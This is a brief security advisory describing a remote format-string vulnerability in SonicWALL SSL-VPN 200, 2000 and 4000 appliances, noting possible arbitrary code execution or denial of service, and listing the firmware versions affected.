Multiple SonicWALL SSL-VPN devices are prone to a remote format-string vulnerability because they fail to properly sanitize user-supplied input before passing it as the format specifier to a formatted-printing function.

Attackers may exploit this issue to run arbitrary code in the context of the affected application. Failed attempts may cause denial-of-service conditions.

The following are vulnerable:

SSL-VPN 200 firmware prior to 3.0.0.9
SSL-VPN 2000 firmware prior to 3.5.0.5
SSL-VPN 4000 firmware prior to 3.5.0.5
